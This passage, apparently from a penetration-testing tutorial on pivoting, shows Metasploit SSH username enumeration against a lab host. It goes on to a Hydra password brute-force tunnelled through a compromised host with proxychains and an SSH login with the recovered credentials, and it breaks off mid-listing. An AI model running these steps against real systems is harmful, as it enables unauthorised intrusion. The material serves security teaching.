class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'sa'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'setup'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'cmaker'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'enable'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'MICRO'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'login'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Caught interrupt from the console...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Auxiliary module execution completed</span></div></div><div class=""><div><span class="enlighter-text">^C</span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">ssh_enumusers</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span></div></div></div><div class="enlighter-raw">msf &gt; use auxiliary/scanner/ssh/ssh_enumusers 

msf auxiliary(ssh_enumusers) &gt; set rhosts 7.7.7.20
rhosts =&gt; 7.7.7.20

msf auxiliary(ssh_enumusers) &gt; set rport 22
rport =&gt; 22

msf auxiliary(ssh_enumusers) &gt; set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
user_file =&gt; /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt

msf auxiliary(ssh_enumusers) &gt; run

[*] 7.7.7.20:22 - SSH - Checking for false positives
[*] 7.7.7.20:22 - SSH - Starting scan
[+] 7.7.7.20:22 - SSH - User 'admin' found
[-] 7.7.7.20:22 - SSH - User 'root' not found
[-] 7.7.7.20:22 - SSH - User 'Administrator' not found
[+] 7.7.7.20:22 - SSH - User 'sysadm' found
[-] 7.7.7.20:22 - SSH - User 'tech' not found
[-] 7.7.7.20:22 - SSH - User 'operator' not found
[+] 7.7.7.20:22 - SSH - User 'guest' found
[-] 7.7.7.20:22 - SSH - User 'security' not found
[-] 7.7.7.20:22 - SSH - User 'debug' not found
[+] 7.7.7.20:22 - SSH - User 'manager' found
[-] 7.7.7.20:22 - SSH - User 'service' not found
[-] 7.7.7.20:22 - SSH - User '!root' not found
[+] 7.7.7.20:22 - SSH - User 'user' found
[-] 7.7.7.20:22 - SSH - User 'netman' not found
[+] 7.7.7.20:22 - SSH - User 'super' found
[-] 7.7.7.20:22 - SSH - User 'diag' not found
[+] 7.7.7.20:22 - SSH - User 'Cisco' found
[-] 7.7.7.20:22 - SSH - User 'Manager' not found
[+] 7.7.7.20:22 - SSH - User 'DTA' found
[-] 7.7.7.20:22 - SSH - User 'apc' not found
[+] 7.7.7.20:22 - SSH - User 'User' found
[-] 7.7.7.20:22 - SSH - User 'Admin' not found
[+] 7.7.7.20:22 - SSH - User 'cablecom' found
[-] 7.7.7.20:22 - SSH - User 'adm' not found
[+] 7.7.7.20:22 - SSH - User 'wradmin' found
[-] 7.7.7.20:22 - SSH - User 'netscreen' not found
[+] 7.7.7.20:22 - SSH - User 'sa' found
[-] 7.7.7.20:22 - SSH - User 'setup' not found
[+] 7.7.7.20:22 - SSH - User 'cmaker' found
[-] 7.7.7.20:22 - SSH - User 'enable' not found
[+] 7.7.7.20:22 - SSH - User 'MICRO' found
[-] 7.7.7.20:22 - SSH - User 'login' not found
[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
^C
msf auxiliary(ssh_enumusers) &gt;</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">msf &gt; use auxiliary/scanner/ssh/ssh_enumusers 

msf auxiliary(ssh_enumusers) &gt; set rhosts 7.7.7.20
rhosts =&gt; 7.7.7.20

msf auxiliary(ssh_enumusers) &gt; set rport 22
rport =&gt; 22

msf auxiliary(ssh_enumusers) &gt; set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
user_file =&gt; /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt

msf auxiliary(ssh_enumusers) &gt; run

[*] 7.7.7.20:22 - SSH - Checking for false positives
[*] 7.7.7.20:22 - SSH - Starting scan
[+] 7.7.7.20:22 - SSH - User 'admin' found
[-] 7.7.7.20:22 - SSH - User 'root' not found
[-] 7.7.7.20:22 - SSH - User 'Administrator' not found
[+] 7.7.7.20:22 - SSH - User 'sysadm' found
[-] 7.7.7.20:22 - SSH - User 'tech' not found
[-] 7.7.7.20:22 - SSH - User 'operator' not found
[+] 7.7.7.20:22 - SSH - User 'guest' found
[-] 7.7.7.20:22 - SSH - User 'security' not found
[-] 7.7.7.20:22 - SSH - User 'debug' not found
[+] 7.7.7.20:22 - SSH - User 'manager' found
[-] 7.7.7.20:22 - SSH - User 'service' not found
[-] 7.7.7.20:22 - SSH - User '!root' not found
[+] 7.7.7.20:22 - SSH - User 'user' found
[-] 7.7.7.20:22 - SSH - User 'netman' not found
[+] 7.7.7.20:22 - SSH - User 'super' found
[-] 7.7.7.20:22 - SSH - User 'diag' not found
[+] 7.7.7.20:22 - SSH - User 'Cisco' found
[-] 7.7.7.20:22 - SSH - User 'Manager' not found
[+] 7.7.7.20:22 - SSH - User 'DTA' found
[-] 7.7.7.20:22 - SSH - User 'apc' not found
[+] 7.7.7.20:22 - SSH - User 'User' found
[-] 7.7.7.20:22 - SSH - User 'Admin' not found
[+] 7.7.7.20:22 - SSH - User 'cablecom' found
[-] 7.7.7.20:22 - SSH - User 'adm' not found
[+] 7.7.7.20:22 - SSH - User 'wradmin' found
[-] 7.7.7.20:22 - SSH - User 'netscreen' not found
[+] 7.7.7.20:22 - SSH - User 'sa' found
[-] 7.7.7.20:22 - SSH - User 'setup' not found
[+] 7.7.7.20:22 - SSH - User 'cmaker' found
[-] 7.7.7.20:22 - SSH - User 'enable' not found
[+] 7.7.7.20:22 - SSH - User 'MICRO' found
[-] 7.7.7.20:22 - SSH - User 'login' not found
[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
^C
msf auxiliary(ssh_enumusers) &gt;</pre>
<p>In addition to the auxiliary modules on the Metasploit Framework for attack, Kali tools such as <strong>Hydra</strong> can also be used. By running Hydra in ProxyChains, all traffic will be routed to the target system through the compromised&nbsp;system.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">root@kali:~</span><span class="enlighter-c0"># proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">ProxyChains-</span><span class="enlighter-n0">3.1</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">http:</span><span class="enlighter-c0">//proxychains.sf.net)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Hydra v8.</span><span class="enlighter-m3">2</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">c</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-n1">2016</span><span class="enlighter-text"> by van Hauser/THC - Please </span><span class="enlighter-k1">do</span><span class="enlighter-text"> not use </span><span class="enlighter-k1">in</span><span class="enlighter-text"> military or secret service organizations, or </span><span class="enlighter-k1">for</span><span class="enlighter-text"> illegal purposes.</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">Hydra</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">http:</span><span class="enlighter-c0">//www.thc.org/thc-hydra) starting </span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">WARNING</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m0">Restorefile</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">./hydra.</span><span class="enlighter-m3">restore</span><span class="enlighter-g1">)</span><span class="enlighter-text"> from a previous session found, to prevent overwriting, you have </span><span class="enlighter-n1">10</span><span class="enlighter-text"> seconds to abort...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">DATA</span><span class="enlighter-g1">]</span><span class="enlighter-text"> max </span><span class="enlighter-n1">4</span><span class="enlighter-text"> tasks per </span><span class="enlighter-n1">1</span><span class="enlighter-text"> server, overall </span><span class="enlighter-n1">64</span><span class="enlighter-text"> tasks, </span><span class="enlighter-n1">20</span><span class="enlighter-text"> login </span><span class="enlighter-m0">tries</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">l:</span><span class="enlighter-n1">2</span><span class="enlighter-text">/p:</span><span class="enlighter-n1">10</span><span class="enlighter-g1">)</span><span class="enlighter-text">, ~</span><span class="enlighter-n1">0</span><span class="enlighter-text"> tries per task</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">DATA</span><span class="enlighter-g1">]</span><span class="enlighter-text"> attacking service ssh on port </span><span class="enlighter-n1">22</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-n1">22</span><span class="enlighter-g1">][</span><span class="enlighter-text">ssh</span><span class="enlighter-g1">]</span><span class="enlighter-text"> host: </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">   login: admin   password: </span><span class="enlighter-n1">123456</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|S-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">1</span><span class="enlighter-text"> </span><span class="enlighter-k1">of</span><span class="enlighter-text"> </span><span class="enlighter-n1">1</span><span class="enlighter-text"> target successfully completed, </span><span class="enlighter-n1">1</span><span class="enlighter-text"> valid password found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">Hydra</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">http:</span><span class="enlighter-c0">//www.thc.org/thc-hydra) finished</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">root@kali:~</span><span class="enlighter-c0">#</span></div></div></div><div class="enlighter-raw">root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4
ProxyChains-3.1 (http://proxychains.sf.net)
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting 
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 4 tasks per 1 server, overall 64 tasks, 20 login tries (l:2/p:10), ~0 tries per task
[DATA] attacking service ssh on port 22
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
&lt;&gt;&lt;&gt;-OK
&lt;&gt;&lt;&gt;-OK
&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
[22][ssh] host: 7.7.7.20   login: admin   password: 123456
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished
root@kali:~#</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4
ProxyChains-3.1 (http://proxychains.sf.net)
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting 
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 4 tasks per 1 server, overall 64 tasks, 20 login tries (l:2/p:10), ~0 tries per task
[DATA] attacking service ssh on port 22
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
&lt;&gt;&lt;&gt;-OK
&lt;&gt;&lt;&gt;-OK
&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
[22][ssh] host: 7.7.7.20   login: admin   password: 123456
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished
root@kali:~#</pre>
<p>SSH connection can be made to the target system via proxy server with <strong>admin</strong> username and <strong>123456</strong>&nbsp;password obtained from brute-force attack with Hydra.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">root@kali:~</span><span class="enlighter-c0"># proxychains ssh admin@7.7.7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">ProxyChains-</span><span class="enlighter-n0">3.1</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">http:</span><span class="enlighter-c0">//proxychains.sf.net)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-7.7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">The authenticity </span><span class="enlighter-k1">of</span><span class="enlighter-text"> host </span><span class="enlighter-s0">'7.7.7.20 (7.7.7.20)'</span><span class="enlighter-text"> can</span><span class="enlighter-s0">'t be established.</span></div></div><div class=""><div><span class="enlighter-s0">ECDSA key fingerprint is SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.</span></div></div><div class=""><div><span class="enlighter-s0">Are you sure you want to continue connecting (yes/no)? yes</span></div></div><div class=""><div><span class="enlighter-s0">Warning: Permanently added '</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-s0">' (ECDSA) to the list of known hosts.</span></div></div><div class=""><div><span class="enlighter-s0">admin@7.7.7.20'</span><span class="enlighter-text">s password: </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">bvshell:/C/Documents and Settings/All Users$ pwd</span></div></div><div class=""><div><span class="enlighter-text">/C/Documents and Settings/All Users</span></div></div><div class=""><div><span class="enlighter-text">bvshell:/C/Documents and Settings/All Users$ dir</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">2016</span><span class="enlighter-text">-</span><span class="enlighter-n1">12</span><span class="enlighter-text">-</span><span class="enlighter-n1">24</span><span class="enlighter-text">  </span><span class="enlighter-n1">21</span><span class="enlighter-text">:</span><span class="enlighter-n1">32</span><span class="enlighter-text">          </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">DIR</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Application Data</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">2016</span><span class="enlighter-text">-</span><span class="enlighter-n1">12</span><span class="enlighter-text">-</span><span class="enlighter-n1">25</span><span class="enlighter-text">  </span><span class="enlighter-n4">06</span><span class="enlighter-text">:</span><span class="enlighter-n1">16</span><span class="enlighter-text">          </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">DIR</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Desktop</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">2016</span><span class="enlighter-text">-</span><span class="enlighter-n1">12</span><span class="enlighter-text">-</span><span class="enlighter-n1">24</span><span class="enlighter-text">  </span><span class="enlighter-n1">18</span><span class="enlighter-text">:</span><span class="enlighter-n1">36</span><span class="enlighter-text">          </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">DIR</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> Documents</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">2016</span><span class="enlighter-text">-</span><span class="enlighter-n1">12</span><span class="enlighter-text">-</span><span class="enlighter-n1">24</span><span class="enlighter-text">  </span><span class="enlighter-n1">18</span><span class="enlighter-text">:</span><span class="enlighter-n1">37</span><span class="enlighter-text">          </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">DIR</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> DRM</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">2016</span><span class="enlighter-text">-</span><span class="enlighter-n1">12</span><span class="enlighter-text">-</span><span class="enlighter-n1">24</span><span class="enlighter-text">  </span><span class="enlighter-n1">21</span><span 